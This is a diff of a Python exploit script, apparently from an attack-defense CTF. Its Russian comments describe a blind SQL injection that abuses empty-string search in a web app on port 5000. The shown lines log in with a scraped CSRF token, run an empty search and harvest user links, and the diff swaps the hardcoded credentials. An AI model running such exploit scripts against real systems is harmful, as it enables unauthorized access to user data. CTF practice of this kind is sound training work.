@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
-# Первая уязвимость - BLind SQL Injection. Здесь также используется возможность поиска по пустой строке
-# необходимо зарегестрировать пользователя adm с паролем adm, а также пользователей ttest2 (сначала) и ttest1 (позже)
+# Вторая уязвимость - BLind SQL Injection. Здесь также используется возможность поиска по пустой строке
+# необходимо зарегестрировать пользователя wee с паролем wee, а также пользователей ttest2 (сначала) и ttest1 (позже)
 import requests
 from requests.auth import HTTPBasicAuth
 import json
@@ -30,7 +30,7 @@ with requests.Session() as s:
     p = s.get('http://{}:5000/login'.format(ip))
     csrf = re.findall('name="csrf_token" type="hidden" value="(.*)"', p.text)
     headers = {'Content-type': 'application/x-www-form-urlencoded'}
-    p = s.post('http://{}:5000/login?next=%2Fhome'.format(ip), data = 'csrf_token={}&username=adm&password=adm&submit=Sign+In'.format(csrf[0]).encode('UTF-8'), headers = headers)
+    p = s.post('http://{}:5000/login?next=%2Fhome'.format(ip), data = 'csrf_token={}&username=wee&password=wee&submit=Sign+In'.format(csrf[0]).encode('UTF-8'), headers = headers)
     
     p = s.post('http://{}:5000/search'.format(ip), data = 'csrf_token={}&order=date_created&search='.format(csrf[0]).encode('UTF-8'), headers = headers)
     users = re.findall('<form action="/follow/(.*)" method="post">', p.text)
